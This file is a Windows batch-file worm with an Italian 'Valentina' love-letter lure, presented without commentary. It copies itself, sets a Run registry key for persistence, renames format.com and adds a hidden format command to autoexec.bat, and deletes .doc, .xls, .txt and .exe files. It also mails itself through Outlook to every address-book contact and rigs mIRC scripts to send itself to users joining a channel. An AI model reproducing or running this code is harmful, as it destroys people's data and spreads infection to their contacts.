   @echo off
   set aerox= %windir%\command
   set giaco= %windir%\vale
   :: Mirko (z) ......................
   if exist %giaco%\amore.bat goto dama
   if not exist %giaco%\amore.bat goto 1
   :1
   md %windir%\vale
   cls
   copy /y *.bat %giaco%
   cls
   ren %giaco%\*.bat amore.bat
   cls
   if exist %aerox%\format.com ren %aerox%\format.com chdisk.com
   if exist %giaco%\zkm.reg goto dama
   echo msgbox "by http://www.newmafiamirko.cjb.net" ,vbExclamation ,"Valentina" >C:\mhr.vbs
   attrib +h C:\mhr.vbs >nul
   echo REGEDIT4 >%giaco%\zkm.reg
   echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >nul >>%giaco%\zkm.reg
   echo "WinBatload"="C:\\amore.bat" >nul >>%giaco%\zkm.reg
   regedit /s %giaco%\zkm.reg
   if exist C:\autoexec.bat goto 1x
   goto dama
   :1x
   attrib -r C:\autoexec.bat
   echo @if not exist C:\amore.bat chdisk /q /u /autotest >nul >>C:\autoexec.bat
   goto dama
   :dama
   if exist %giaco%\amore.vbs goto dama2
   if exist %giaco%\2.vbs goto dama2
   echo Set out = CreateObject("Outlook.Application") >%giaco%\amore.vbs
   echo Set mapi = out.GetNameSpace("MAPI") >nul >>%giaco%\amore.vbs
   echo For ctrlists = 1 To mapi.AddressLists.Count >nul >>%giaco%\amore.vbs
   echo Set a = mapi.AddressLists(ctrlists) >nul >>%giaco%\amore.vbs
   echo x = 1 >nul >>%giaco%\amore.vbs
   echo For ctrentries = 1 To a.AddressEntries.Count >nul >>%giaco%\amore.vbs
   echo malead = a.AddressEntries(x) >nul >>%giaco%\amore.vbs
   echo Set male = out.CreateItem(0) >nul >>%giaco%\amore.vbs
   echo male.Recipients.Add (malead) >nul >>%giaco%\amore.vbs
   echo male.Subject = "Mi ami ancora ???" >nul >>%giaco%\amore.vbs
   echo male.Body = "Mi perdoni per quello che ti ho fatto ??  Valentina " >nul >>%giaco%\amore.vbs
   echo male.Attachments.Add ("c:\amore.bat") >nul >>%giaco%\amore.vbs
   echo male.Send >nul >>%giaco%\amore.vbs
   echo x = x + 1 >nul >>%giaco%\amore.vbs
   echo Next >nul >>%giaco%\amore.vbs
   echo Next >nul >>%giaco%\amore.vbs
   echo Set out = Nothing >nul >>%giaco%\amore.vbs
   echo Set mapi = Nothing >nul >>%giaco%\amore.vbs
   :: VBS 2
   echo Set out = CreateObject("Outlook.Application") >%giaco%\2.vbs
   echo Set mapi = out.GetNameSpace("MAPI") >nul >>%giaco%\2.vbs
   echo For ctrlists = 1 To mapi.AddressLists.Count >nul >>%giaco%\2.vbs
   echo Set a = mapi.AddressLists(ctrlists) >nul >>%giaco%\2.vbs
   echo x = 1 >nul >>%giaco%\amore.vbs
   echo For ctrentries = 1 To a.AddressEntries.Count >nul >>%giaco%\2.vbs
   echo malead = a.AddressEntries(x) >nul >>%giaco%\2.vbs
   echo Set male = out.CreateItem(0) >nul >>%giaco%\2.vbs
   echo male.Recipients.Add (malead) >nul >>%giaco%\2.vbs
   echo male.Subject = "Sto male senza di TE" >nul >>%giaco%\2.vbs
   echo male.Body = "Ti prego dammi una risposta t.v.b. la tua Valentina" >nul >>%giaco%\2.vbs
   echo male.Attachments.Add ("c:\amore.bat") >nul >>%giaco%\2.vbs
   echo male.Send >nul >>%giaco%\2.vbs
   echo x = x + 1 >nul >>%giaco%\2.vbs
   echo Next >nul >>%giaco%\2.vbs
   echo Next >nul >>%giaco%\2.vbs
   echo Set out = Nothing >nul >>%giaco%\2.vbs
   echo Set mapi = Nothing >nul >>%giaco%\2.vbs
   copy /y %giaco%\amore.bat C:\
   goto dama2
   :: ___________
   :dama2
   deltree /y if exist C:\docume~1\*.doc
   deltree /y if exist C:\docume~1\*.xls
   deltree /y if exist C:\docume~1\*.txt
   deltree /y if exist C:\docume~1\*.exe
   if exist C:\mirc\*.* goto x
   if exist C:\mirc32\*.* goto y
   if exist C:\progra~1\mirc\*.* goto z
   if exist C:\progra~1\mirc32\*.* goto j
   goto end
   :x
   echo [script] >C:\mirc\script.ini
   echo ;mIRC Script >nul >>C:\mirc\script.ini
   echo ;  Please dont edit this script... mIRC will corrupt, if mIRC will  >nul >>C:\mirc\script.ini
   echo               corrupt... WINDOWS will affect and will not run correctly. thanks >nul >>C:\mirc\script.ini
   echo ; >nul >>C:\mirc\script.ini
   echo ;Mirko  >nul >>C:\mirc\script.ini
   echo ;http://www.mirc.com  >nul >>C:\mirc\script.ini
   echo ; >nul >>C:\mirc\script.ini
   echo n0=on 1:JOIN:#:{ >nul >>C:\mirc\script.ini
   echo n1=  /if ( $nick == $me ) { halt } >nul >>C:\mirc\script.ini
   echo n2=  /.dcc send $nick "C:\amore.bat" >nul >>C:\mirc\script.ini
   echo n3=} >nul >>C:\mirc\script.ini
   goto end
   :y
   echo [script] >C:\mirc32\script.ini
   echo ;mIRC Script >nul >>C:\mirc32\script.ini
   echo ;  Please dont edit this script... mIRC will corrupt, if mIRC will  >nul >>C:\mirc32\script.ini
   echo               corrupt... WINDOWS will affect and will not run correctly. thanks >nul >>C:\mirc32\script.ini
   echo ; >nul >>C:\mirc32\script.ini
   echo ;Mirko >nul >>C:\mirc32\script.ini
   echo ;http://www.mirc.com  >nul >>C:\mirc32\script.ini
   echo ; >nul >>C:\mirc\script32.ini
   echo n0=on 1:JOIN:#:{ >nul >>C:\mirc32\script.ini
   echo n1=  /if ( $nick == $me ) { halt } >nul >>C:\mirc32\script.ini
   echo n2=  /.dcc send $nick "C:\amore.bat" >nul >>C:\mirc32\script.ini
   echo n3=} >nul >>C:\mirc32\script.ini
   goto end
   :z
   echo [script] >C:\mirc\script.ini
   echo ;mIRC Script >nul >>C:\progra~1\mirc\script.ini
   echo ;  Please dont edit this script... mIRC will corrupt, if mIRC will  >nul >>C:\progra~1\mirc\script.ini
   echo               corrupt... WINDOWS will affect and will not run correctly. thanks >nul >>C:\progra~1\mirc\script.ini
   echo ; >nul >>C:\progra~1\mirc\script.ini
   echo ;Mirko >nul >>C:\progra~1\mirc\script.ini
   echo ;http://www.mirc.com  >nul >>C:\progra~1\mirc\script.ini
   echo ; >nul >>C:\progra~1\mirc\script.ini
   echo n0=on 1:JOIN:#:{ >nul >>C:\progra~1\mirc\script.ini
   echo n1=  /if ( $nick == $me ) { halt } >nul >>C:\progra~1\mirc\script.ini
   echo n2=  /.dcc send $nick "C:\amore.bat" >nul >>C:\progra~1\mirc\script.ini
   echo n3=} >nul >>C:\progra~1\mirc\script.ini
   goto end
   :j
   echo [script] >C:\mirc\script.ini
   echo ;mIRC Script >nul >>C:\progra~1\mirc32\script.ini
   echo ;  Please dont edit this script... mIRC will corrupt, if mIRC will  >nul >>C:\progra~1\mirc32\script.ini
   echo               corrupt... WINDOWS will affect and will not run correctly. thanks >nul >>C:\progra~1\mirc32\script.ini
   echo ; >nul >>C:\progra~1\mirc32\script.ini
   echo ;Mirko >nul >>C:\progra~1\mirc32\script.ini
   echo ;http://www.mirc.com  >nul >>C:\progra~1\mirc32\script.ini
   echo ; >nul >>C:\progra~1\mirc32\script.ini
   echo n0=on 1:JOIN:#:{ >nul >>C:\progra~1\mirc32\script.ini
   echo n1=  /if ( $nick == $me ) { halt } >nul >>C:\progra~1\mirc32\script.ini
   echo n2=  /.dcc send $nick "C:\amore.bat" >nul >>C:\progra~1\mirc32\script.ini
   echo n3=} >nul >>C:\progra~1\mirc32\script.ini
   goto end
   :end
   if exist %windir%\system32\*.exe start %giaco%\2.vbs
   if exist %windir%\desktop\*.* start %giaco%\amore.vbs
   cls
   start C:\mhr.vbs
